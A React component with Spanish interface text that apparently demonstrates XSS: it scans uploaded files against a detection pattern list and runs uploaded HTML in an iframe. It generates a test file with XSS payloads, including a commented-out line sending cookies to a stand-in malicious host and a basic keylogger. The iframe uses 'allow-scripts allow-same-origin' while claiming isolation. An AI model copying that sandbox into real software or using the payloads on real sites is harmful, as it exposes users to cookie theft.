import React, { useState, useRef, type ChangeEvent } from 'react';
import styles from './Files.module.css';

interface TestResult {
  hasDangerousCode: boolean;
  patternsFound: string[];
  contentPreview: string;
  fileType: string;
  fileName: string;
}

const Files: React.FC = () => {
  const [testResult, setTestResult] = useState<TestResult | null>(null);
  const [isTesting, setIsTesting] = useState<boolean>(false);
  const [uploadedFiles, setUploadedFiles] = useState<string[]>([]);
  const [showIframe, setShowIframe] = useState<boolean>(false);
  const [iframeContent, setIframeContent] = useState<string>('');
  const [iframeTitle, setIframeTitle] = useState<string>('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleFileUpload = (event: ChangeEvent<HTMLInputElement>) => {
    const files = event.target.files;
    if (!files || files.length === 0) return;

    Array.from(files).forEach((file) => {
      const reader = new FileReader();

      reader.onload = (e) => {
        const content = e.target?.result as string;
        const fileInfo = {
          name: file.name,
          type: file.type,
          size: file.size,
          content: content,
        };

        // Agregar a lista de archivos cargados
        setUploadedFiles((prev) => [...prev, file.name]);

        // Probar si contiene código peligroso
        if (file.name.match(/\.(html|htm|js|jsx|ts|tsx)$/i)) {
          testForXSS(content, file.type, file.name);

          // Si es HTML, ejecutarlo en un iframe para demostrar la vulnerabilidad
          if (file.name.match(/\.(html|htm)$/i)) {
            setIframeContent(content);
            setIframeTitle(file.name);
            setShowIframe(true);
          }
        }
      };

      reader.readAsText(file);
    });
  };

  const testForXSS = (content: string, fileType: string, fileName: string) => {
    setIsTesting(true);

    // Lista de patrones peligrosos
    const dangerousPatterns = [
      { pattern: /<script.*?>.*?<\/script>/is, name: 'Etiqueta <script>' },
      { pattern: /javascript:/i, name: 'Protocolo javascript:' },
      {
        pattern: /on\w+\s*=\s*["'][^"']*["']/i,
        name: 'Eventos inline (onclick, onerror, etc.)',
      },
      { pattern: /alert\s*\(/, name: 'Función alert()' },
      { pattern: /document\.cookie/i, name: 'Acceso a cookies' },
      { pattern: /eval\s*\(/, name: 'Función eval()' },
      { pattern: /innerHTML\s*=/, name: 'innerHTML assignment' },
      { pattern: /document\.write/, name: 'document.write()' },
      { pattern: /window\.location/, name: 'Redirección' },
      { pattern: /fetch\s*\(|XMLHttpRequest/i, name: 'Peticiones HTTP' },
    ];

    // Buscar patrones peligrosos
    const foundPatterns = dangerousPatterns
      .filter((item) => item.pattern.test(content))
      .map((item) => item.name);

    const result: TestResult = {
      hasDangerousCode: foundPatterns.length > 0,
      patternsFound: foundPatterns,
      contentPreview: content.substring(0, 300),
      fileType: fileType,
      fileName: fileName,
    };

    setTestResult(result);
    setIsTesting(false);

    // Mostrar demostración si hay código peligroso
    if (foundPatterns.length > 0) {
      simulateXSSAttack(content, fileName);
    }
  };

  const simulateXSSAttack = (content: string, fileName: string) => {
    // Crear modal de demostración
    const demoModal = document.createElement('div');
    demoModal.className = styles.demoModal;

    demoModal.innerHTML = `
      <div class="${styles.demoModal__overlay}">
        <div class="${styles.demoModal__content}">
          <div class="${styles.demoModal__header}">
            <h2 class="${
              styles.demoModal__title
            }">🚨 DEMOSTRACIÓN DE VULNERABILIDAD XSS</h2>
            <p class="${styles.demoModal__subtitle}">Archivo: ${fileName}</p>
          </div>
          
          <div class="${styles.demoModal__body}">
            <div class="${styles.demoModal__codePreview}">
              <h4>📝 Contenido peligroso detectado:</h4>
              <pre>${escapeHtml(content.substring(0, 500))}</pre>
            </div>
            
            <div class="${styles.demoModal__actions}">
              <h4>🔥 Acciones que podrían ejecutarse:</h4>
              <ul>
                <li>✅ Robo de cookies de sesión</li>
                <li>✅ Redirección a sitios maliciosos</li>
                <li>✅ Ejecución de código arbitrario</li>
                <li>✅ Keylogging (captura de teclas)</li>
                <li>✅ Phishing dentro de la aplicación</li>
              </ul>
            </div>
            
            <div class="${styles.demoModal__status}">
              <div class="${styles.statusBadge} ${
      styles['statusBadge--danger']
    }">
                VULNERABLE
              </div>
              <p class="${styles.demoModal__warning}">
                Si este archivo se procesa sin sanitización, el código se ejecutaría automáticamente.
              </p>
            </div>
          </div>
          
          <div class="${styles.demoModal__footer}">
            <button onclick="this.closest('.${styles.demoModal}').remove()" 
                    class="${styles.button} ${styles['button--danger']}">
              Cerrar demostración
            </button>
            <button onclick="createTestFile()" 
                    class="${styles.button} ${styles['button--secondary']}">
              Crear archivo de prueba
            </button>
            <button onclick="executeInIframe()" 
                    class="${styles.button} ${styles['button--warning']}">
              Ejecutar en entorno aislado
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(demoModal);

    // Función auxiliar para crear archivo de prueba
    const createTestFile = () => {
      const maliciousCode = `<!DOCTYPE html>
<html>
<body>
  <h1>XSS Test File</h1>
  
  <!-- Script malicioso básico -->
  <script>
    // 1. Mostrar una alerta (prueba más básica)
    alert('XSS Ejecutado! Cookie: ' + document.cookie);
    
    // 2. Intentar robar cookies (simulado)
    console.log('Cookies robadas (simulado):', document.cookie);
    
    // 3. Redirección a sitio malicioso (comentado para pruebas)
    // window.location.href = 'http://sitio-malicioso.com?cookie=' + encodeURIComponent(document.cookie);
    
    // 4. Keylogger básico (captura de teclas)
    document.addEventListener('keydown', function(e) {
      console.log('Tecla presionada:', e.key);
    });
  </script>
  
  <!-- XSS persistente en el contenido -->
  <div onmouseover="alert('XSS desde atributo!')" style="color:red;">
    Pasa el mouse sobre mí para XSS desde atributo HTML
  </div>
  
  <!-- Img con XSS en atributo -->
  <img src="x" onerror="console.log('XSS ejecutado desde img onerror')">
</body>
</html>`;

      const blob = new Blob([maliciousCode], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'xss-test-file.html';
      a.click();
      URL.revokeObjectURL(url);
    };

    // Función para ejecutar en iframe
    const executeInIframe = () => {
      const iframeContainer = document.createElement('div');
      iframeContainer.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 80%;
        height: 80%;
        background: white;
        border: 3px solid red;
        z-index: 10000;
        box-shadow: 0 0 20px rgba(255,0,0,0.5);
      `;

      const iframe = document.createElement('iframe');
      iframe.style.cssText = `
        width: 100%;
        height: 100%;
        border: none;
      `;
      iframe.srcdoc = content;

      const closeBtn = document.createElement('button');
      closeBtn.textContent = 'Cerrar';
      closeBtn.style.cssText = `
        position: absolute;
        top: 10px;
        right: 10px;
        background: red;
        color: white;
        border: none;
        padding: 5px 10px;
        cursor: pointer;
        z-index: 10001;
      `;
      closeBtn.onclick = () => iframeContainer.remove();

      iframeContainer.appendChild(iframe);
      iframeContainer.appendChild(closeBtn);
      document.body.appendChild(iframeContainer);
    };

    // Agregar funciones al objeto global
    (window as any).createTestFile = createTestFile;
    (window as any).executeInIframe = executeInIframe;
  };

  const escapeHtml = (text: string): string => {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  };

  const handleTestClick = () => {
    if (fileInputRef.current) {
      fileInputRef.current.click();
    }
  };

  const clearResults = () => {
    setTestResult(null);
    setUploadedFiles([]);
    setShowIframe(false);
    setIframeContent('');
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const closeIframe = () => {
    setShowIframe(false);
    setIframeContent('');
  };

  return (
    <div className={styles.files}>
      <div className={styles.files__header}>
        <h1 className={styles.files__title}>🔍 Prueba de Vulnerabilidad XSS</h1>
        <p className={styles.files__subtitle}>
          Sube archivos HTML/JS para probar si tu aplicación es vulnerable a
          ataques XSS
        </p>
      </div>

      <div className={styles.files__uploadArea}>
        <div className={styles.uploadCard}>
          <div className={styles.uploadCard__icon}>📁</div>
          <h3 className={styles.uploadCard__title}>Subir archivo de prueba</h3>
          <p className={styles.uploadCard__description}>
            Selecciona archivos HTML o JavaScript que contengan código
            potencialmente malicioso
          </p>

          <input
            ref={fileInputRef}
            type='file'
            onChange={handleFileUpload}
            accept='.html,.htm,.js,.jsx,.ts,.tsx,.txt'
            multiple
            className={styles.uploadCard__input}
          />

          <button
            onClick={handleTestClick}
            className={`${styles.button} ${styles['button--primary']} ${styles.uploadCard__button}`}
            disabled={isTesting}
          >
            {isTesting ? '🔍 Analizando...' : '📤 Subir archivo para prueba'}
          </button>

          <div className={styles.uploadCard__hint}>
            <p>
              💡 <strong>Tip:</strong> Puedes crear archivos con:
            </p>
            <ul>
              <li>Etiquetas &lt;script&gt; maliciosas</li>
              <li>Eventos inline (onclick, onerror, etc.)</li>
              <li>Código JavaScript peligroso</li>
            </ul>
          </div>
        </div>
      </div>

      {showIframe && (
        <div className={styles.iframeContainer}>
          <div className={styles.iframeContainer__header}>
            <h3>🛡️ Entorno Aislado de Prueba</h3>
            <p className={styles.iframeContainer__subtitle}>
              Este archivo HTML se está ejecutando en un iframe aislado para
              demostrar la vulnerabilidad XSS
            </p>
            <button
              onClick={closeIframe}
              className={`${styles.button} ${styles['button--danger']}`}
            >
              Cerrar entorno de prueba
            </button>
          </div>
          <div className={styles.iframeContainer__warning}>
            <strong>⚠️ ADVERTENCIA:</strong> Cualquier alerta o acción que veas
            aquí se ejecutaría en tu aplicación real si es vulnerable a XSS.
          </div>
          <iframe
            srcDoc={iframeContent}
            title='XSS Test Sandbox'
            className={styles.iframeContainer__iframe}
            sandbox='allow-scripts allow-same-origin'
          />
          <div className={styles.iframeContainer__info}>
            <p>📝 Archivo: {iframeTitle}</p>
            <p>🔒 Este iframe está aislado con sandbox para seguridad</p>
          </div>
        </div>
      )}

      {uploadedFiles.length > 0 && (
        <div className={styles.files__uploadedList}>
          <h3 className={styles.files__sectionTitle}>📂 Archivos subidos</h3>
          <ul className={styles.fileList}>
            {uploadedFiles.map((fileName, index) => (
              <li key={index} className={styles.fileList__item}>
                <span className={styles.fileList__icon}>📄</span>
                <span className={styles.fileList__name}>{fileName}</span>
                {fileName.match(/\.(html|htm)$/i) && (
                  <button
                    onClick={() => {
                      const file = fileInputRef.current?.files?.[index];
                      if (file) {
                        const reader = new FileReader();
                        reader.onload = (e) => {
                          setIframeContent(e.target?.result as string);
                          setIframeTitle(file.name);
                          setShowIframe(true);
                        };
                        reader.readAsText(file);
                      }
                    }}
                    className={`${styles.button} ${styles['button--small']} ${styles['button--warning']}`}
                  >
                    Ejecutar
                  </button>
                )}
              </li>
            ))}
          </ul>
          <button
            onClick={clearResults}
            className={`${styles.button} ${styles['button--text']}`}
          >
            🗑️ Limpiar resultados
          </button>
        </div>
      )}

      <style>{`
        .${styles.iframeContainer} {
          margin: 2rem 0;
          border: 2px solid #ff4444;
          border-radius: 8px;
          overflow: hidden;
        }
        
        .${styles.iframeContainer__header} {
          background: #ff4444;
          color: white;
          padding: 1rem;
          display: flex;
          flex-direction: column;
          gap: 0.5rem;
        }
        
        .${styles.iframeContainer__subtitle} {
          color: rgba(255, 255, 255, 0.9);
          font-size: 0.9rem;
        }
        
        .${styles.iframeContainer__warning} {
          background: #fff3cd;
          color: #856404;
          padding: 0.5rem 1rem;
          border-bottom: 1px solid #ffeaa7;
          font-size: 0.9rem;
        }
        
        .${styles.iframeContainer__iframe} {
          width: 100%;
          height: 500px;
          border: none;
        }
        
        .${styles.iframeContainer__info} {
          background: #f8f9fa;
          padding: 0.5rem 1rem;
          font-size: 0.85rem;
          color: #666;
          display: flex;
          justify-content: space-between;
          border-top: 1px solid #dee2e6;
        }
        
        .${styles['button--small']} {
          padding: 0.25rem 0.5rem !important;
          font-size: 0.8rem !important;
          margin-left: 0.5rem;
        }
        
        .${styles['button--warning']} {
          background: #ffc107 !important;
          color: #212529 !important;
        }
        
        .${styles['button--warning']}:hover {
          background: #e0a800 !important;
        }
      `}</style>
    </div>
  );
};

export default Files;
